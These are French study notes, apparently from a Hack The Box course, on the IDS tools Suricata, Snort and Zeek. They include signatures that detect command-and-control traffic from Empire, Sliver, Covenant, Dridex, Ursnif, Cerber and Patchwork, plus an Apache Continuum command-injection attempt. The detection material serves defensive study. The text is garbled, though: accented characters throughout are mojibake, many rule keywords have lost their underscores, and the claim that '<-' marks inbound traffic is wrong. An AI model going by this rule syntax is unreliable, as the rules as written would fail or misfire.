Syst√®me de Pr√©vention d'Intrusions (IPS) : Agit de mani√®re proactive en bloquant le trafic suspect avant qu'il n'entre dans le r√©seau, ce qui am√©liore la s√©curit√©, mais au prix d'une latence accrue.
Syst√®me de D√©tection et de Pr√©vention d'Intrusions (IDPS) : Combine les fonctionnalit√©s IDS et IPS, surveillant passivement tout en √©tant capable d'envoyer des paquets de r√©initialisation (RST) pour terminer des sessions suspectes.
Surveillance de la S√©curit√© du R√©seau (NSM) : Se contente de journaliser toutes les donn√©es r√©seau, capturant chaque transaction pour une analyse forensique et r√©trospective.

Entr√©es de Suricata
Entr√©e hors ligne : Traite les fichiers PCAP stock√©s, adapt√©s pour l'analyse r√©trospective et le test de r√®gles.
Entr√©e en direct :
LibPCAP : Lit les paquets depuis les interfaces r√©seau, avec des performances limit√©es.
NFQ : Mode IPS en ligne sous Linux, utilisant IPTables pour passer les paquets √† Suricata pour inspection.
AF\PACKET : Version am√©lior√©e de LibPCAP, prenant en charge le multi-threading et adapt√©e √† l'analyse en temps r√©el sur les syst√®mes Linux compatibles.

Sorties de Suricata

Suricata g√©n√®re divers types de journaux, y compris des alertes, des requ√™tes DNS, des requ√™tes HTTP et des donn√©es de flux r√©seau. Les principales sorties sont :
EVE JSON : Journalise les √©v√©nements au format JSON pour √™tre compatible avec des outils comme Logstash, couvrant des types d'√©v√©nements tels que les alertes, DNS, HTTP et TLS.
Unified2 : Format binaire d'alerte compatible avec Snort, permettant l'int√©gration avec des outils Snort comme u2spewfoo.

Exemple de consultation du journal EVE JSON

Kailez@htb[/htb]$ less /var/log/suricata/oldeve.json
Configuration de Suricata et r√®gles personnalis√©es
Lister les fichiers de r√®gles : Voir les fichiers de r√®gles disponibles.

  Kailez@htb[/htb]$ ls -lah /etc/suricata/rules/
  Modifier les variables de Suricata : D√©finir $HOMENET et $EXTERNALNET dans suricata.yaml pour repr√©senter les segments r√©seau de confiance et non de confiance, respectivement.
Ajouter des r√®gles personnalis√©es :
  Exemple de r√®gle pour alerter sur les transactions HTTP :

  alert http any any -&gt; any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  Manipulation des entr√©es Suricata
Analyse hors ligne :

  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/suspicious.pcap
  Entr√©e en direct utilisant AF\PACKET :

  Kailez@htb[/htb]$ sudo suricata --af-packet=ens160
  Utilisation de tcpreplay pour simuler le trafic :

  Kailez@htb[/htb]$ sudo tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap
  Journaux de Suricata
EVE JSON : Un journal complet au format JSON contenant des √©v√©nements tels que les alertes, HTTP, DNS et des m√©tadonn√©es TLS.

  Pour ne voir que les √©v√©nements d'alerte :

  cat /var/log/suricata/oldeve.json | jq -c 'select(.eventtype == "alert")'
  fast.log : Journal texte enregistrant uniquement les alertes, utile pour un examen rapide.

  Kailez@htb[/htb]$ cat /var/log/suricata/oldfast.log
  stats.log : Affiche les statistiques et l'utilisation des ressources, utile pour surveiller les performances.

  Kailez@htb[/htb]$ cat /var/log/suricata/old_stats.log
  Extraction de fichiers

Suricata peut extraire des fichiers transf√©r√©s via certains protocoles pour une analyse forensique.
Activer l'extraction de fichiers dans suricata.yaml :

  file-store:
    version: 2
    enabled: yes
    force-filestore: yes
  Ajouter une r√®gle d'extraction personnalis√©e :
  Exemple :

  alert http any any -&gt; any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  Ex√©cuter Suricata sur un fichier PCAP :

  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/vm-2.pcap
  Inspecter les fichiers extraits :

  Kailez@htb[/htb]$ cd filestore
  Kailez@htb[/htb]$ find . -type f
  Mise √† jour et rechargement des r√®gles
Activer le rechargement en direct des r√®gles :

  detect-engine:
reload: true
  Recharger les r√®gles :

  Kailez@htb[/htb]$ sudo kill -usr2 $(pidof suricata)
  Mettre √† jour les ensembles de r√®gles avec suricata-update :

  Kailez@htb[/htb]$ sudo suricata-update
  Lister les sources disponibles des ensembles de r√®gles :

  Kailez@htb[/htb]$ sudo suricata-update list-sources
  Activer des ensembles de r√®gles sp√©cifiques :

  Kailez@htb[/htb]$ sudo suricata-update enable-source et/open
  Validation de la configuration Suricata

Pour valider la configuration de Suricata et vous assurer qu'elle est correctement param√©tr√©e :

Kailez@htb[/htb]$ sudo suricata -T -c /etc/suricata/suricata.yaml
Caract√©ristiques principales de Suricata
Inspection approfondie des paquets : Inspection compl√®te du contenu et des en-t√™tes des paquets.
D√©tection de protocoles : Prise en charge de multiples protocoles pour une surveillance compl√®te du r√©seau.
D√©tection et pr√©vention des intrusions : Modes polyvalents pour une d√©fense passive et active.
Extraction de fichiers : Capture des fichiers transf√©r√©s via certains protocoles pour une analyse forensique.
Rechargement des r√®gles en direct : Mise √† jour des r√®gles sans interruption du service.
Journalisation compl√®te : JSON, fast.log, et plus encore, pour des insights personnalis√©s dans le trafic r√©seau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Suricata Rule Development Part 1</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8001-9efb-f871bbafa06a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Les r√®gles Suricata sont utilis√©es pour surveiller le trafic r√©seau √† la recherche de motifs ou d'indicateurs sp√©cifiques, souvent r√©v√©lateurs de comportements malveillants. Ces r√®gles peuvent fournir des informations cruciales sur l'activit√© r√©seau, aider √† la d√©tection des menaces et contribuer √† des strat√©gies de s√©curit√© r√©seau proactives.
Anatomie d'une r√®gle Suricata

Voici un exemple de r√®gle de base de Suricata :

action protocol fromip port -&gt; toip port (msg:"Comportement malveillant connu, possible infection par le malware X"; content:"certaines cha√Ænes"; content:"autres cha√Ænes"; sid:10000001; rev:1;)
Composants de la r√®gle :
En-t√™te (action protocol from\ip port -&gt; to\ip port) :
Action : Indique √† Suricata ce qu'il doit faire lorsque la r√®gle correspond :
alert : G√©n√®re une alerte.
log : Journalise le paquet sans alerter.
drop : Bloque le paquet (en mode IPS).
Protocole : Sp√©cifie le protocole r√©seau (tcp, udp, icmp, etc.).
Direction du trafic :
-&gt; pour le trafic sortant, &lt;- pour le trafic entrant, et &lt;-&gt; pour bidirectionnel.
Ports : D√©finit les ports source et destination pour l‚Äô√©valuation.
Message et Contenu de la R√®gle :
msg : Description affich√©e lorsque la r√®gle est d√©clench√©e, souvent incluant des informations sur le malware.
content : Cha√Ænes sp√©cifiques ou valeurs que Suricata recherche dans le contenu du paquet.
     Exemple :

     content:"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip";
     Le contenu peut √™tre optimis√© avec des tampons de r√®gles, comme http.accept pour faire correspondre uniquement les en-t√™tes HTTP Accept.
Options suppl√©mentaires :
nocase : Rend la r√®gle insensible √† la casse.
offset : D√©finit la position de d√©part dans le paquet pour la correspondance.
distance : Sp√©cifie la distance en octets par rapport √† la correspondance pr√©c√©dente.
dsize : Correspond √† la taille du charge utile du paquet (par exemple, dsize:&gt;10000 pour les paquets de grande taille).
M√©tadonn√©es :
sid : Identifiant de signature unique pour chaque r√®gle.
rev : Num√©ro de r√©vision indiquant les mises √† jour de la r√®gle.
reference : Une URL ou un identifiant fournissant du contexte ou des sources pour la r√®gle.

Exemple d‚Äôutilisation de r√®gles avec PCRE

Les expressions r√©guli√®res compatibles avec Perl (PCRE) augmentent la flexibilit√© de la d√©tection. Voici un exemple :

alert http any any -&gt; $HOMENET any (msg: "ATTACK [PTsecurity] Apache Continuum &lt;= v1.4.2 CMD Injection"; content: "POST"; httpmethod; content: "/continuum/saveInstallation.action"; offset: 0; depth: 34; httpuri; content: "installation.varValue="; nocase; httpclientbody; pcre: !"/^\$?[\sa-z\\0-9.-](\&amp;|$)/iRP"; flow: toserver, established; sid: 10000048; rev: 1;)
PCRE : Permet la correspondance de motifs complexes en utilisant des expressions r√©guli√®res. Elles sont entour√©es de /.../ et peuvent utiliser des drapeaux comme i pour l'insensibilit√© √† la casse et RP pour le positionnement relatif.

Approches de d√©veloppement des r√®gles IDS/IPS
D√©tection bas√©e sur les signatures : Correspond aux motifs connus (par exemple, cha√Ænes de malware ou structures de paquets). C‚Äôest pr√©cis pour les menaces connues, mais limit√© pour d√©tecter les nouvelles.
D√©tection bas√©e sur les anomalies : Se concentre sur les comportements r√©seau inhabituels (par exemple, motifs de transfert de donn√©es). Cela aide √† d√©tecter les attaques de type zero-day, mais peut g√©n√©rer des faux positifs.
Analyse des protocoles d‚Äô√©tat : Suit les √©tats des protocoles pour identifier les transitions ou comportements inhabituels, adapt√© √† la d√©tection de mauvaise utilisation des protocoles.

Exemples de d√©veloppement de r√®gles Suricata

Exemple 1 : D√©tection de PowerShell Empire

alert http $HOMENET any -&gt; $EXTERNALNET any (msg:"ET MALWARE Possible activit√© PowerShell Empire sortante"; flow:established,toserver; content:"GET"; httpmethod; content:"/"; httpuri; depth:1; pcre:"/^(?:login\/process|admin\/get|news)\.php$/RU"; content:"session="; httpcookie; pcre:"/^(?:[A-Z0-9+/]{4})(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi"; content:"Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1"; httpuseragent; httpstart; content:".php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session="; fastpattern; httpheadernames; content:!"Referer"; content:!"Cache"; content:!"Accept"; sid:2027512; rev:1;)
D√©tecte les requ√™tes HTTP GET de PowerShell Empire avec des motifs URI sp√©cifiques et des cookies encod√©s en base64.

Exemple 2 : D√©tection de Covenant

alert tcp any any -&gt; $HOMENET any (msg:"d√©tect√© par body"; content:"&lt;title&gt;Hello World!&lt;/title&gt;"; detectionfilter: track bysrc, count 4 , seconds 10; priority:1; sid:3000011;)
D√©clenche lorsqu'un paquet HTTP contenant &lt;title&gt;Hello World!&lt;/title&gt; appara√Æt au moins quatre fois dans les 10 secondes provenant de la m√™me source.

Exemple 3 : D√©tection par taille et compteur de Covenant

alert tcp $HOMENET any -&gt; any any (msg:"d√©tect√© par taille et compteur"; dsize:312; detectionfilter: track bysrc, count 3 , seconds 10; priority:1; sid:3000001;)
D√©tecte les paquets dont la charge utile fait exactement 312 octets, envoy√©s au moins trois fois dans une fen√™tre de 10 secondes.

Exemple 4 : D√©tection de l'implant C2 Sliver

alert tcp any any -&gt; any any (msg:"Implant C2 Sliver d√©tect√©"; content:"POST"; pcre:"/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.php)\?[a-z]{1,2}=[a-z0-9]{1,10}/i"; sid:1000007; rev:1;)
D√©tecte les requ√™tes HTTP POST vers des URI associ√©es √† Sliver, un framework C2, en utilisant des motifs de r√©pertoires et de fichiers PHP sp√©cifiques.

R√®gle suppl√©mentaire pour la d√©tection de Sliver via les cookies

alert tcp any any -&gt; any any (msg:"Implant C2 Sliver d√©tect√© - Cookie"; content:"Set-Cookie"; pcre:"/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\=[a-z0-9]{32}\;/"; sid:1000003; rev:1;)
D√©tecte les cookies avec des noms comme PHPSESSID ou APISID et des valeurs correspondant √† un motif alphanum√©rique de 32 caract√®res, souvent associ√© √† Sliver.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Suricata Rule Development Part 2 (Encrypted Traffic)</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-803e-9c3a-e0ee048981bc"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Techniques cl√©s pour la d√©tection des menaces sur le trafic chiffr√©
Certificats SSL/TLS : Lors de la poign√©e de main SSL/TLS, des informations telles que l'√©metteur, le sujet et le domaine sont √©chang√©es et restent non chiffr√©es. Les attaquants peuvent utiliser des certificats avec des caract√©ristiques inhabituelles, ce qui permet de les d√©tecter en se basant sur ces anomalies.
Hachage JA3 : Les hachages JA3 fournissent une empreinte unique d‚Äôun client SSL/TLS en hachant certains attributs du message Client Hello lors de la poign√©e de main. Ces hachages aident √† identifier des caract√©ristiques uniques associ√©es √† certaines familles de malwares.

Exemples de r√®gles Suricata pour la d√©tection de trafic chiffr√©
Exemple 5 : D√©tection de Dridex (TLS chiffr√©)

alert tls $EXTERNALNET any -&gt; $HOMENET any (msg:"ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)"; flow:established,fromserver; content:"|16|"; content:"|0b|"; within:8; bytetest:3,&lt;,1200,0,relative; content:"|03 02 01 02 02 09 00|"; fastpattern; content:"|30 09 06 03 55 04 06 13 02|"; distance:0; pcre:"/^[A-Z]{2}/R"; content:"|55 04 07|"; distance:0; content:"|55 04 0a|"; distance:0; pcre:"/^.{2}[A-Z][a-z]{3,}\s(?:[A-Z][a-z]{3,}\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\.[A-Za-z]){1,3})\.?[01]/Rs"; content:"|55 04 03|"; distance:0; bytetest:1,&gt;,13,1,relative; content:!"www."; distance:2; within:4; pcre:"/^.{2}(?P&lt;CN&gt;(?:(?:\d?[A-Z]?|[A-Z]?\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9][a-z]{3,6})\.){0,2}?(?:\d?[A-Z]?|[A-Z]?\d?)[a-z]{3,}(?:[0-9-][a-z]{3,})?\.(?!com|org|net|tv)[a-z]{2,9})[01].?(?P=CN)[01]/Rs"; content:!"|2a 86 48 86 f7 0d 01 09 01|"; content:!"GoDaddy"; sid:2023476; rev:5;)
But : D√©tecte les certificats SSL associ√©s au trojan Dridex en se basant sur des motifs sp√©cifiques dans la poign√©e de main SSL/TLS.
Options cl√©s :
Valeurs hexad√©cimales : content:"|16|"; content:"|0b|"; within:8; pour la poign√©e de main et le type de certificat.
Identifiants de champ : V√©rifie les champs countryName et commonName.
OID : S√©quences ASN.1 repr√©sentant des champs comme countryName, localityName, organizationName, etc.
PCRE : V√©rifie les motifs dans le commonName avec une correspondance de structure suppl√©mentaire.

Test de la r√®gle : D√©commentez cette r√®gle dans local.rules et ex√©cutez Suricata sur le fichier dridex.pcap.

Exemple 6 : D√©tection de Sliver (TLS chiffr√©)

alert tls any any -&gt; any any (msg:"Sliver C2 SSL"; ja3.hash; content:"473cd7cb9faa642487833865d516e578"; sid:1002; rev:1;)
But : D√©tecte le trafic C2 de Sliver en faisant correspondre un hachage JA3 connu.
Options cl√©s :
ja3.hash : Recherche le hachage JA3 sp√©cifique associ√© √† Sliver.

Test de la r√®gle* : Obtenez le hachage JA3 en utilisant l'outil ja3 sur le fichier sliverenc.pcap. D√©commentez cette r√®gle dans local.rules et ex√©cutez Suricata sur sliverenc.pcap pour valider la d√©tection.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Snort Fundamentals</summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80b8-8828-c06829e44b96"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Snort : Pr√©sentation G√©n√©rale

Snort est un outil open-source qui agit comme un syst√®me de d√©tection d'intrusion (IDS) et un syst√®me de pr√©vention d'intrusion (IPS). Il peut √©galement √™tre utilis√© comme analyseur de paquets ou renifleur de trafic.
Snort inspecte l‚Äôensemble du trafic r√©seau et peut enregistrer toutes les activit√©s, offrant une visibilit√© compl√®te au niveau de la couche application. Son comportement est dirig√© par des r√®gles sp√©cifiques qui d√©finissent ce qu‚Äôil doit surveiller ou identifier.

Modes de Fonctionnement de Snort
IDS/IPS en mode inline : Permet de bloquer activement le trafic lorsqu‚Äôil fonctionne comme IPS.
IDS passif : Observe et journalise le trafic sans l‚Äôinterrompre.
IDS bas√© sur le r√©seau : Surveille le trafic r√©seau provenant de plusieurs h√¥tes.
IDS bas√© sur l‚Äôh√¥te : Rarement utilis√© avec Snort (des outils sp√©cialis√©s sont plus adapt√©s).

Modules DAQ (Data Acquisition)

Les modules DAQ permettent √† Snort d'interagir avec les sources de donn√©es r√©seau.
Mode passif : Observe le trafic sans le bloquer.
Mode inline : Peut bloquer le trafic selon les r√®gles d√©finies (ex. : utilisation de l‚Äôoption -Q avec le module DAQ afpacket).

Architecture de Snort
Sniffer de paquets : D√©crypte le trafic r√©seau et transmet les paquets aux pr√©processeurs.
Pr√©processeurs : Analysent les types de paquets et leur comportement. Configur√©s dans le fichier snort.lua, ils d√©tectent par exemple le trafic HTTP ou les scans.
Moteur de d√©tection : Compare les paquets aux r√®gles Snort.
Journalisation et alertes : Les paquets correspondants aux r√®gles sont enregistr√©s, souvent dans syslog ou des bases de donn√©es, √† l‚Äôaide de plugins de sortie d√©finis dans snort.lua.

Configuration de Snort
Fichiers de configuration :
snort.lua : Fichier principal, contenant les variables r√©seau, les d√©codeurs, le moteur de d√©tection, et les sorties.
snortdefaults.lua : Fournit des configurations par d√©faut.

Pour visualiser ou modifier la configuration :

sudo more /root/snorty/etc/snort/snort.lua
Valider la configuration :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq
Sources d‚Äôentr√©e de Snort
Analyse d‚Äôun fichier PCAP :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap
Surveillance en temps r√©el d‚Äôune interface r√©seau :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i nominterface
R√®gles Snort

Les r√®gles Snort sont compos√©es d‚Äôun en-t√™te (d√©finissant les crit√®res) et d‚Äôoptions (actions et contenus sp√©cifiques). Elles sont int√©gr√©es dans snort.lua, g√©n√©ralement dans la section ips :

ips = {
    { variables = default_variables, include = '/chemin/vers/fichier.rules' }
}
Chargement des r√®gles en ligne de commande :
Fichier unique : -R /chemin/vers/fichier.rules
R√©pertoire contenant plusieurs r√®gles : --rule-path /chemin/vers/dossier

Sorties de Snort

Snort peut g√©n√©rer plusieurs types de rapports :
Statistiques de base : R√©sume le nombre de paquets, les types d‚Äôactivit√©, les fichiers trait√©s, et les performances du syst√®me.
Alertes :
-A cmg : Affiche des alertes rapides avec en-t√™tes de paquets et payloads.
-A u2 : Format binaire Unified2, pour traitement post-analyse.
-A csv : Format CSV.
Statistiques de performance : Surveillent la m√©moire, le CPU et les performances g√©n√©rales.

Pour lister les plugins de sortie disponibles :

snort --list-plugins | grep logger
Exemple avec sortie en format cmg :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap -A cmg
Fonctionnalit√©s cl√©s de Snort
Inspection approfondie des paquets (Deep Packet Inspection).
D√©tection d‚Äôintrusion en temps r√©el.
Surveillance de la s√©curit√© r√©seau.
Prise en charge du trafic IPv4 et IPv6.
D√©tection d‚Äôanomalies et support multi-locataire.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Snort Rule Development</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8078-abe0-d0239902f236"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">R√®gles Snort : D√©tection d'activit√©s malveillantes

Une r√®gle Snort est un outil puissant permettant d'identifier et de signaler des activit√©s malveillantes potentielles dans le trafic r√©seau. Bien que les r√®gles Snort ressemblent aux r√®gles Suricata avec une structure compos√©e d'un en-t√™te de r√®gle et d'options, la documentation de Snort offre des conseils d√©taill√©s pour cr√©er des r√®gles efficaces.

Voici des exemples de r√®gles pour d√©tecter des malwares sp√©cifiques. Vous pouvez utiliser ces r√®gles en SSH sur le syst√®me cible pour reproduire et comprendre les commandes.

Exemple 1 : D√©tection d'Ursnif (de mani√®re inefficace)

alert tcp any any -&gt; any any (msg:"Possible Ursnif C2 Activity"; flow:established,toserver; content:"/images/", depth 12; content:"2F"; content:"2B"; content:"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT"; content:!"Accept"; content:!"Cookie|3a|"; content:!"Referer|3a|"; sid:1000002; rev:1;)
Cette r√®gle d√©tecte le malware Ursnif en cherchant des motifs sp√©cifiques dans le trafic HTTP :
flow:established,toserver; : correspond aux connexions TCP √©tablies vers le serveur.
content:"/images/", depth 12; : cherche la cha√Æne /images/ dans les 12 premiers octets.
D'autres champs content correspondent √† des motifs suppl√©mentaires, comme "\2F", "\2B" et des en-t√™tes HTTP sp√©cifiques.
! dans content:!"Accept"; indique l'absence de certains en-t√™tes HTTP.

Tester la r√®gle sur le fichier ursnif.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg
Exemple 2 : D√©tection de Cerber

alert udp $HOMENET any -&gt; $EXTERNALNET any (msg:"Possible Cerber Check-in"; dsize:9; content:"hi", depth 2, fastpattern; pcre:"/^[af0-9]{7}$/R"; detectionfilter:track bysrc, count 1, seconds 60; sid:2816763; rev:4;)
Cette r√®gle cible le malware Cerber :
dsize:9; : restreint la r√®gle aux datagrammes ayant une charge utile de 9 octets.
content:"hi", depth 2, fastpattern; : recherche "hi" dans les deux premiers octets.
pcre:"/^[af0-9]{7}$/R"; : utilise une expression r√©guli√®re pour rechercher sept caract√®res hexad√©cimaux apr√®s "hi".
detectionfilter limite la fr√©quence des alertes par source.

Tester la r√®gle sur le fichier cerber.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg
Exemple 3 : D√©tection de Patchwork

alert http $HOMENET any -&gt; $EXTERNALNET any (msg:"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon"; flow:established,toserver; httpmethod; content:"POST"; httpuri; content:".php?profile="; httpclientbody; content:"ddager=", depth 7; httpclientbody; content:"&amp;r1=", distance 0; httpheader; content:!"Accept"; httpheader; content:!"Referer|3a|"; sid:10000006; rev:1;)
Cette r√®gle d√©tecte le malware Patchwork APT en cherchant des motifs HTTP sp√©cifiques :
flow:established,toserver; : sp√©cifie les connexions sortantes.
httpmethod; content:"POST"; : recherche des requ√™tes HTTP POST.
httpclientbody et httpheader filtrent pour des contenus sp√©cifiques et l'absence d'en-t√™tes.

Tester avec le fichier patchwork.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
Exemple 4 : D√©tection de Patchwork (SSL)

alert tcp $EXTERNALNET any -&gt; $HOMENET any (msg:"Patchwork SSL Cert Detected"; flow:established,fromserver; content:"|55 04 03|"; content:"|08|toigetgf", distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)
Cette r√®gle SSL d√©tecte le malware Patchwork en cherchant des motifs dans les certificats SSL :
content:"|55 04 03|"; : cible les champs de nom commun dans les certificats X.509 au format ASN.1.
distance et within affinent la recherche.

Ex√©cuter avec le fichier patchwork.pcap :

sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
R√©sum√© des Commandes et Tests
Tester une r√®gle avec un fichier PCAP :
Ex√©cution pour chaque fichier pcap sp√©cifi√© (ursnif.pcap, cerber.pcap, etc.).
Option -A cmg permet de formater les alertes pour les afficher rapidement.

Chaque exemple de r√®gle Snort se concentre sur des motifs sp√©cifiques dans le trafic r√©seau pour identifier des comportements associ√©s √† des malwares comme Ursnif, Cerber, ou Patchwork. Ces r√®gles peuvent √™tre adapt√©es et optimis√©es selon les besoins de votre infrastructure de s√©curit√©.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Zeek Fundamentals</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8055-9154-d3b73156326f"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Zeek est un analyseur de trafic r√©seau open-source largement utilis√© pour identifier des activit√©s r√©seau suspectes ou malveillantes. Il est √©galement tr√®s efficace pour le d√©pannage r√©seau et la mesure des performances. Zeek g√©n√®re des fichiers journaux qui fournissent des informations d√©taill√©es sur toutes les activit√©s r√©seau, ce qui en fait un outil pr√©cieux pour les √©quipes de cybers√©curit√© (blue teams). Ces journaux contiennent des enregistrements d√©taill√©s des connexions et des activit√©s au niveau de la couche application, telles que les requ√™tes DNS, les sessions HTTP, etc. En outre, les fonctions de Zeek permettent une analyse approfondie et une d√©tection qui vont au-del√† de la simple journalisation.

L'une des caract√©ristiques les plus marquantes de Zeek est son langage de script puissant, qui permet aux utilisateurs de cr√©er des scripts personnalis√©s similaires aux r√®gles de Suricata. Ce langage permet aux √©quipes de s√©curit√© de d√©velopper des strat√©gies d'analyse r√©seau et de d√©tection d'intrusions sur mesure.
Caract√©ristiques de d√©tection de Zeek

Plut√¥t que de se contenter d'une d√©tection bas√©e sur des signatures, Zeek propose une d√©tection par abus s√©mantique, d√©tection d'anomalies et analyse comportementale.

Modes de fonctionnement de Zeek

Zeek fonctionne dans plusieurs modes :
Analyse de trafic enti√®rement passive : Ne g√©n√®re pas de trafic r√©seau mais observe et analyse le trafic existant.
Interface libpcap pour la capture de paquets : Utilise libpcap pour la capture de paquets r√©seau.
Analyse en temps r√©el et hors ligne : Peut √™tre ex√©cut√© en mode en temps r√©el ou avec des fichiers PCAP pour une analyse hors ligne.
Support des clusters pour des d√©ploiements √† grande √©chelle : Zeek peut √™tre d√©ploy√© en mode cluster pour analyser de mani√®re distribu√©e de grandes quantit√©s de trafic r√©seau.

Architecture de Zeek

L'architecture de Zeek est compos√©e de deux composants principaux :
Moteur d'√©v√©nements (noyau) :
Transforme le flux de paquets entrants en une s√©rie d'√©v√©nements de haut niveau qui d√©crivent l'activit√© r√©seau.
Ces √©v√©nements sont neutres en termes de politique, ils d√©crivent ce qui s'est pass√© sans l'interpr√©ter (par exemple, une requ√™te HTTP est enregistr√©e comme un √©v√©nement httprequest).
Interpr√©teur de script :
Ex√©cute les gestionnaires d'√©v√©nements √©crits dans le langage de script de Zeek (scripts Zeek), qui sp√©cifient les politiques de s√©curit√© du site.
Les √©v√©nements g√©n√©r√©s par le noyau de Zeek sont trait√©s de mani√®re s√©quentielle par les scripts.

Les √©v√©nements de Zeek sont principalement d√©finis dans les fichiers .bif situ√©s dans /scripts/base/bif/plugins/. Pour une liste compl√®te des √©v√©nements, consultez la documentation des √©v√©nements Zeek.

Journaux de Zeek

Lors de l'ex√©cution de Zeek en mode hors ligne avec un fichier PCAP, les journaux sont enregistr√©s dans le r√©pertoire actuel. Les journaux courants incluent :
conn.log : D√©taille les connexions IP, TCP, UDP et ICMP.
dns.log : Enregistre les requ√™tes et r√©ponses DNS.
http.log : Enregistre les d√©tails des requ√™tes et r√©ponses HTTP.
ftp.log : Enregistre les requ√™tes et r√©ponses FTP.
smtp.log : Enregistre les transactions SMTP, y compris les d√©tails de l'exp√©diteur et du destinataire.
Exemple de http.log :

Le fichier http.log contient des champs tels que host, uri, referrer, user\agent et status\_code.

Pour une liste compl√®te des journaux et des champs de Zeek, consultez la documentation des journaux Zeek.

Zeek compresse les fichiers journaux toutes les heures en utilisant gzip et d√©place les journaux plus anciens dans un r√©pertoire nomm√© selon la date (format AAAA-MM-JJ). Pour g√©rer ces journaux compress√©s, utilisez des outils comme gzcat (pour afficher le contenu) et zgrep (pour rechercher dans les journaux).

Zeek fournit √©galement zeek-cut, un utilitaire pour extraire des colonnes sp√©cifiques des journaux de Zeek, facilitant ainsi l'analyse des journaux.

Fonctionnalit√©s cl√©s de Zeek

Les principales fonctionnalit√©s qui renforcent l'efficacit√© de Zeek sont :
Journalisation d√©taill√©e des activit√©s r√©seau : Capture une grande vari√©t√© d'activit√©s r√©seau, y compris les protocoles de la couche application (par exemple, HTTP, DNS, FTP, SMTP, SSH, SSL).
Inspection du contenu des fichiers √©chang√©s via des protocoles de la couche application.
Support d'IPv6 : Zeek prend en charge l'analyse du trafic IPv6.
D√©tection et analyse des tunnels : Identifie les tunnels r√©seau.
V√©rifications de validit√© dans l'analyse des protocoles.
Correspondance de mod√®les similaire √† un IDS : D√©tection bas√©e sur des motifs de comportement suspects.
Langage de script puissant : Permet d'ajouter des analyses personnalis√©es et de g√©rer des √©tats au sein des scripts.
Sortie des journaux en ASCII par d√©faut : Options pour int√©grer avec des outils comme ElasticSearch et DataSeries.
Int√©gration en temps r√©el des entr√©es externes : Permet d'analyser des flux en temps r√©el.
Interface avec des biblioth√®ques C : Partage des √©v√©nements Zeek avec d'autres programmes.
Capacit√© √† d√©clencher des processus externes depuis le langage de script.

Pour aller plus loin avec Zeek

Pour des exemples de r√®gles, des bases de scripting et des cas d'utilisation, consultez la documentation des exemples de Zeek. Si vous d√©butez, le guide de d√©marrage rapide de Zeek est une excellente ressource.

Zeek est un outil extr√™mement flexible et puissant pour l'analyse du trafic r√©seau, la d√©tection d'intrusions et le diagnostic des probl√®mes r√©seau, offrant des capacit√©s bien au-del√† de l'analyse classique bas√©e sur des signatures.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Intrusion Detection With Zeek</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8000-9e78-fb365ae70cd1"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exemples de d√©tection d'intrusion
Exemple 1 : D√©tection de malware utilisant du beaconing

